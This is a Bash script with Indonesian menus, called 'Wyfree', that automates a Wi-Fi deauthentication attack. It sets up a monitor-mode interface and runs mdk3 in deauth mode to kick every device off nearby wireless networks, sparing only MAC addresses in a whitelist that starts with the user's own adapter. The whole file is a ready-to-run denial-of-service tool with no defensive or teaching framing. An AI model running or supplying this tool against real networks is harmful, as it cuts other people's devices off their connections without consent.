#!/bin/bash
##Changelogs
#26/09/2016
#[+]Rilis Pertama
##
#Warna
orange="\033[0;38;5;3m"
white="\033[1;37m"
grey="\033[0;37m"
red="\033[1;31m"
lgreen="\033[1;32m"
yellow="\033[1;33m"
lblue="\033[1;34m"
blue="\033[0;38;5;6m"
#Beberapa Variabel
cyarat=false
#Versi Script
version=1.0
#Keluar
keluar() {
echo $grey
if test -d /sys/class/net/mon0 ;then
	if ! test -e /root/.wyfree/simpan ;then
	iw mon0 del
	fi
fi
exit
}
#Cek Hak Akses Admin
if ! [ $(id -u) = "0" ] 2>/dev/null; then
	echo "Kamu Tidak Punya Hak Akses Admin/Root, Gunakan sudo atau su"
	exit
fi
#Animasi Loading
animasi() {
    local pid=$1
    local delay=0.75
    local spinstr='|/-\'
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}
#Judul
judul() {
clear
echo "${lgreen}###################################################"
echo "${lgreen}#${lblue}__      __     __                                ${lgreen}#"
echo "${lgreen}#${lblue}\ \    / /  _ / _|_ _ ___ ___                    ${lgreen}#"
echo "${lgreen}#${lblue} \ \/\/ / || |  _| '_/ -_) -_)                   ${lgreen}#"
echo "${lgreen}#${lblue}  \_/\_/ \_, |_| |_| \___\___|                   ${lgreen}#"	
echo "${lgreen}#${lblue}         |__/            ${red}v.${version}${lblue} by:${lblue}T-roy${red}7${white}1 & ${red}7${lblue}UFF${white}1${lgreen}#"
echo "${lgreen}###################################################"
}
#Cek Persyaratan
syarat() {
echo ""
echo -n ${white}Adaptor Wireless.
	if test -d /sys/class/net/wlan0 ; then
		echo "${lgreen}Ada"
	else
		echo "${red}Tidak Ada"
		cyarat=true
	fi
	sleep 0.025
echo -n ${white}Koneksi Ke Wifi..
	if ifconfig wlan0 |grep -q "RUNNING"; then
		echo "${lgreen}Ada"
	else
		echo "${red}Tidak Ada"
		cyarat=true
	fi
	sleep 0.025
echo -n ${white}Iw...............
	if ! hash iw 2>/dev/null; then
		echo "${red}Tidak Ada"
		cyarat=true
	else
		echo "${lgreen}Ada"
	fi
	sleep 0.025
echo -n ${white}Iwconfig.........
	if ! hash iwconfig 2>/dev/null; then
		echo "${red}Tidak Ada"
		cyarat=true
	else
		echo "${lgreen}Ada"
	fi
	sleep 0.025
echo -n ${white}Mdk3.............
	if ! hash mdk3 2>/dev/null; then
		echo "${red}Tidak Ada"
		cyarat=true
	else
		echo "${lgreen}Ada"
	fi
	sleep 0.025
echo -n ${white}Nano.............
	if ! hash nano 2>/dev/null; then
		echo "${red}Tidak Ada"
		cyarat=true
	else
		echo "${lgreen}Ada"
	fi
	sleep 0.025
echo -n ${white}Xterm............
	if ! hash xterm 2>/dev/null; then
		echo "${red}Tidak Ada"
		cyarat=true
	else
		echo "${lgreen}Ada"
	fi
	sleep 0.025
echo $grey
	if $cyarat ; then
		keluar
	fi	
}
judul
syarat
echo -n Loading File... && sleep 3.5 &
animasi "$!"
#Folder Untuk Menyimpan Whitelist/Blacklist
if ! test -d /root/.wyfree; then
	mkdir /root/.wyfree
fi	
##Whitelist MAC address kamu
if ! test -e  /root/.wyfree/whitelist.txt; then
	echo "#Yang Dibawah Ini adalah MAC Address Kamu (JANGAN DI HAPUS!!!)" >> /root/.wyfree/whitelist.txt
	cat /sys/class/net/wlan0/address >> /root/.wyfree/whitelist.txt
fi
#Menu Utama
menuutama() {
judul
sleep 0.025 && echo "${white}1. ${lblue}Tendang"
sleep 0.025 && echo "${white}2. ${lblue}Buat Interface mon0"
sleep 0.025 && echo "${white}3. ${lblue}Cek Interface mon0"
sleep 0.025 && echo "${white}4. ${lblue}Hapus Interface mon0"
sleep 0.025 && echo "${white}9. ${lblue}Pengaturan"
sleep 0.025 && echo "${white}0. ${red}Exit"
echo -n  ${white}Jawabanmu= & read respon
jawaban
}
#Function Untuk Menu Utama
nomor1() {
echo "Menyiapkan Tendangan..."
	if test -d /sys/class/net/mon0 ;then
		sleep 2
   		ifconfig mon0 down
		iwconfig mon0 mode monitor
		ifconfig mon0 up
		echo "Sedang Menendang..."
		xterm -e "mdk3 mon0 d -w /root/.wyfree/whitelist.txt"
		menuutama
	else
		sleep 2		
		echo -n ${red}Interface mon0 tidak ditemukan, silahkan buat dulu && sleep 3.5 &
		animasi "$!"
		menuutama
	fi
}
nomor2() {
echo "Mengecek interface mon0..."
	sleep 2
	if test -d /sys/class/net/mon0 ;then
		echo -n ${yellow}Interface mon0 sudah ada && sleep 3.5 &
		animasi "$!"
		menuutama
	else 	echo "Membuat Interface mon0..."
			iw wlan0 interface add mon0 type monitor
			ifconfig mon0 down
			iwconfig mon0 mode monitor
			ifconfig mon0 up
			echo -n ${lgreen}Interface mon0 Berhasil Di buat && sleep 3.5 &
			animasi "$!"
			menuutama
	fi
}
nomor3() {
echo "Mengecek interface mon0..."
	sleep 2
	if test -d /sys/class/net/mon0 ;then
		if iwconfig mon0 | grep -q "Managed" ;then		
			ifconfig mon0 down
      		iwconfig mon0 mode monitor
      		ifconfig mon0 up
		fi
		echo -n ${lgreen}Interface mon0 sudah ada dan siap di gunakan && sleep 3.5 &
		animasi "$!"
		menuutama
	else
		echo -n ${red}Interface mon0 tidak ditemukan && sleep 3.5 &
		animasi "$!"
		menuutama
	fi
}
nomor4() {
echo "Mengecek interface mon0..."
sleep 2
if test -d /sys/class/net/mon0 ;then
	iw mon0 del
	echo -n ${lgreen}Interface mon0 berhasil dihapus && sleep 3.5 &
	animasi "$!"
	menuutama
else
	echo -n ${red}Interface mon0 tidak ditemukan && sleep 3.5 &
	animasi "$!"
	menuutama
fi
}
nomor9() {
judul
sleep 0.025 && echo "${white}Apa yang ingin kamu ubah?"
sleep 0.025 && echo "${white}1.${lblue}Simpan interface mon0 ketika keluar?"
sleep 0.025 && echo "${white}2.${lblue}Edit File Whitelist"
sleep 0.025 && echo "${white}0.${red}Kembali ke menu utama"
echo -n ${white}Jawabanmu= & read jawab
if echo $jawab | grep -q "1" ;then
	nomor91
elif echo $jawab | grep -q "2" ;then
	nomor92
elif echo $jawab | grep -q "0" ;then
	menuutama
else
	nomor9
fi
}
nomor91() {
if test -e /root/.wyfree/simpan ;then
	ada="${lgreen}disimpan"
	gada="${red}dihapus"
   else
	ada="${red}dihapus"
	gada="${lgreen}disimpan"
fi
judul
sleep 0.025 && echo "${white}Saat ini interface mon0 akan ${ada} ${white}ketika keluar"
sleep 0.025 && echo "${white}Ubah menjadi ${gada} ${white}ketika keluar?(ya/tidak)"
echo -n ${white}Jawabanmu= & read yatidak
		if echo "$yatidak" | grep -q "ya" ; then
			if echo $gada | grep -q "disimpan" ;then
				echo "" >> /root/.wyfree/simpan
			else 
				rm /root/.wyfree/simpan
			fi
			echo -n ${yellow}Interface mon0 akan ${gada} ${yellow}ketika keluar && sleep 3.5 &
			animasi "$!"
			nomor9
		elif echo "$yatidak" | grep -q "tidak" ;  then
			echo -n ${yellow}Interface mon0 akan ${ada} ${yellow}ketika keluar && sleep 3.5 &
			animasi "$!"
			nomor9
		else
			nomor91
		fi
}
nomor92() {
nano /root/.wyfree/whitelist.txt
nomor9
}
jawaban() {
if echo "$respon" | grep -q "1" ; then
	nomor1
elif echo "$respon" | grep -q "2" ;then
	nomor2
elif echo "$respon" | grep -q "3" ;then
	nomor3
elif echo "$respon" | grep -q "4" ;then
	nomor4
elif echo "$respon" | grep -q "9" ;then
	nomor9
elif echo "$respon" | grep -q "0" ;then
	keluar
else
	menuutama
fi
}
menuutama
